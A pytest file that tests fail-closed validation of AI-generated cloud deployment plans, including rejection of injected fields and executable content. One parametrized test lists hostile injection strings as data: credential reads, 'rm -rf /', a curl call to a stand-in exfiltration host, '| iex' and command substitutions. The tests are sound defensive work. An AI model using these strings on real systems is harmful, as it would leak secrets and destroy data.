"""T014 — the deterministic-execution boundary (ADR-0001) must fail closed.

This is the most important test file in the repository. Everything downstream trusts that a
``DeploymentPlan`` which exists is a plan the orchestrator can safely act on. If any case here ever
passes malformed input, that trust is misplaced and nothing built on top of it is sound.

Each test feeds one specific kind of bad model output and asserts rejection. Nothing here asserts a
"best effort" or "partial" result, because FR-011 forbids producing one.
"""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from groundwork_contracts import DeploymentPlan

pytestmark = pytest.mark.contract


def test_valid_plan_is_accepted(valid_plan: DeploymentPlan) -> None:
    """Sanity check: the fixture really is valid.

    Without this, a bug that rejects everything would make every other test in the file pass for
    the wrong reason.
    """
    assert valid_plan.blueprint_id == "standard-production-fabric"
    assert valid_plan.fabric_capacity_sku.capacity_units == 2


def test_unknown_field_is_rejected(plan_payload: dict[str, object]) -> None:
    """An extra field means the model produced something we do not understand."""
    plan_payload["escalate_privileges"] = True
    with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
        DeploymentPlan.model_validate(plan_payload)


@pytest.mark.parametrize(
    "forbidden_field",
    [
        "tenant_id",
        "tenantId",
        "plan_hash",
        "planHash",
        "approval_status",
        "approvalStatus",
        "validation_summary",
        "requesting_identity",
        "is_approved",
    ],
)
def test_control_plane_owned_fields_are_rejected(
    plan_payload: dict[str, object], forbidden_field: str
) -> None:
    """T015 — a model must not assert identity, tenancy, or approval.

    ``tenant_id`` is the important one: accepting it would let conversation content redirect the
    deployment target, which is the exact attack the least-authority-per-tool rule (ADR-0012)
    exists to stop. These fields are
    not declared on the model, so ``extra="forbid"`` rejects them structurally rather than relying
    on a check someone has to remember to write.
    """
    plan_payload[forbidden_field] = "injected-value"
    with pytest.raises(ValidationError):
        DeploymentPlan.model_validate(plan_payload)


def test_missing_required_field_is_not_defaulted(
    plan_payload: dict[str, object],
) -> None:
    """A missing required field fails the request. It is not filled in with a guess."""
    del plan_payload["subscription_id"]
    with pytest.raises(ValidationError, match="subscription_id"):
        DeploymentPlan.model_validate(plan_payload)


def test_wrong_schema_version_is_rejected(plan_payload: dict[str, object]) -> None:
    plan_payload["schema_version"] = "2.0.0"
    with pytest.raises(ValidationError):
        DeploymentPlan.model_validate(plan_payload)


def test_malformed_blueprint_id_is_rejected(plan_payload: dict[str, object]) -> None:
    """The schema boundary enforces id shape; catalogue approval is runtime state."""
    plan_payload["blueprint_id"] = "NOT VALID"
    with pytest.raises(ValidationError):
        DeploymentPlan.model_validate(plan_payload)


def test_alternate_catalogue_blueprint_id_is_schema_valid(plan_payload: dict[str, object]) -> None:
    plan_payload["blueprint_id"] = "dev-sandbox"

    plan = DeploymentPlan.model_validate(plan_payload)

    assert plan.blueprint_id == "dev-sandbox"


def test_unapproved_region_is_rejected(plan_payload: dict[str, object]) -> None:
    """Region is closed to the Australian set (FR-053b)."""
    plan_payload["region"] = "eastus"
    with pytest.raises(ValidationError):
        DeploymentPlan.model_validate(plan_payload)


def test_malformed_subscription_id_is_rejected(
    plan_payload: dict[str, object],
) -> None:
    plan_payload["subscription_id"] = "not-a-guid"
    with pytest.raises(ValidationError):
        DeploymentPlan.model_validate(plan_payload)


def test_empty_resource_set_is_rejected(plan_payload: dict[str, object]) -> None:
    """A plan that creates nothing is not a deployment plan."""
    plan_payload["resource_set"] = []
    with pytest.raises(ValidationError):
        DeploymentPlan.model_validate(plan_payload)


def test_truncated_output_is_rejected() -> None:
    """A model that stops mid-generation must not yield a usable plan.

    Real failure mode: token limits and network interruptions produce partial objects. FR-011
    requires the request to fail rather than the valid prefix being executed.
    """
    with pytest.raises(ValidationError):
        DeploymentPlan.model_validate(
            {"blueprint_id": "standard-production-fabric", "blueprint_version": "1.0.0"}
        )


@pytest.mark.parametrize(
    "injected",
    [
        "[reference(resourceId('Microsoft.Storage/storageAccounts','x'))]",
        "${env:AZURE_CLIENT_SECRET}",
        "$(whoami)",
        "`Get-AzAccessToken`",
        "value; rm -rf /",
        "value && curl https://exfil.example/steal",
        "normal | iex",
    ],
)
def test_executable_content_in_properties_is_rejected(
    plan_payload: dict[str, object], injected: str
) -> None:
    """FR-026 — model output never becomes executable content.

    Note these are *rejected*, not sanitised. Stripping the dangerous part would leave a plan that
    looks valid but no longer says what the model meant, which is a worse failure than refusing.
    """
    resources = plan_payload["resource_set"]
    assert isinstance(resources, list)
    resources[1]["properties"] = {"sku": injected}
    with pytest.raises(ValidationError, match=r"template expression|interpolation|command"):
        DeploymentPlan.model_validate(plan_payload)


def test_executable_content_in_logical_name_is_rejected(
    plan_payload: dict[str, object],
) -> None:
    resources = plan_payload["resource_set"]
    assert isinstance(resources, list)
    resources[0]["logical_name"] = "rg-$(id)"
    with pytest.raises(ValidationError):
        DeploymentPlan.model_validate(plan_payload)


def test_nested_object_in_properties_is_rejected(
    plan_payload: dict[str, object],
) -> None:
    """Properties accept scalars only.

    A nested structure is how a template body would be smuggled through a parameter value.
    """
    resources = plan_payload["resource_set"]
    assert isinstance(resources, list)
    resources[1]["properties"] = {"nested": {"template": "payload"}}
    with pytest.raises(ValidationError):
        DeploymentPlan.model_validate(plan_payload)


def test_duplicate_logical_names_are_rejected(
    plan_payload: dict[str, object],
) -> None:
    """Duplicates would make the FR-029 idempotence contract unverifiable."""
    resources = plan_payload["resource_set"]
    assert isinstance(resources, list)
    resources[1]["logical_name"] = resources[0]["logical_name"]
    with pytest.raises(ValidationError, match="duplicate logical resource names"):
        DeploymentPlan.model_validate(plan_payload)


def test_zero_uncertainty_band_is_rejected(plan_payload: dict[str, object]) -> None:
    """FR-018 — an unqualified figure presented as precise is a defect."""
    cost = plan_payload["cost_estimate"]
    assert isinstance(cost, dict)
    cost["uncertainty_lower_pct"] = 0.0
    cost["uncertainty_upper_pct"] = 0.0
    with pytest.raises(ValidationError, match="uncertainty"):
        DeploymentPlan.model_validate(plan_payload)


def test_medium_risk_without_findings_is_rejected(
    plan_payload: dict[str, object],
) -> None:
    """A severity claim with nothing behind it tells the customer nothing."""
    risk = plan_payload["risk_assessment"]
    assert isinstance(risk, dict)
    risk["severity"] = "medium"
    risk["findings"] = []
    with pytest.raises(ValidationError, match="requires at least one finding"):
        DeploymentPlan.model_validate(plan_payload)


def test_implausible_duration_is_rejected(plan_payload: dict[str, object]) -> None:
    plan_payload["estimated_duration_minutes"] = 100_000
    with pytest.raises(ValidationError):
        DeploymentPlan.model_validate(plan_payload)


def test_dependency_on_undeclared_stage_is_rejected(
    plan_payload: dict[str, object],
) -> None:
    plan_payload["dependencies"] = [
        {"stage": "fabric", "requires": ["a-stage-that-does-not-exist"]}
    ]
    with pytest.raises(ValidationError, match="undeclared stage"):
        DeploymentPlan.model_validate(plan_payload)


def test_plan_is_immutable(valid_plan: DeploymentPlan) -> None:
    """Frozen models mean a validated plan cannot drift after its hash is taken."""
    with pytest.raises(ValidationError):
        valid_plan.region = valid_plan.region  # type: ignore[misc]


def test_content_hash_is_stable_and_ignores_transcript(
    valid_plan: DeploymentPlan,
) -> None:
    """Identity depends on the deployment, not on how the customer phrased the request.

    Two customers reaching an identical plan through different conversations have the same
    deployment. Including the transcript would break FR-020's approval binding for no benefit.
    """
    from groundwork_contracts import Clarification

    first = valid_plan.content_hash()
    assert first == valid_plan.content_hash()
    assert first.startswith("sha256:")

    with_transcript = valid_plan.model_copy(
        update={
            "clarifications_gathered": (
                Clarification(question="Which region?", answer="Australia East"),
            )
        }
    )
    assert with_transcript.content_hash() == first


def test_content_hash_changes_when_deployment_changes(
    valid_plan: DeploymentPlan,
) -> None:
    """A material change must invalidate the approval bound to the old hash (FR-022)."""
    changed = valid_plan.model_copy(update={"estimated_duration_minutes": 46})
    assert changed.content_hash() != valid_plan.content_hash()


def test_below_f64_requires_licensing_disclosure(valid_plan: DeploymentPlan) -> None:
    """FR-013d — F2 default means the Power BI viewer caveat applies."""
    from groundwork_contracts import FabricCapacitySku

    assert valid_plan.requires_licensing_disclosure() is True

    at_f64 = valid_plan.model_copy(update={"fabric_capacity_sku": FabricCapacitySku.F64})
    assert at_f64.requires_licensing_disclosure() is False
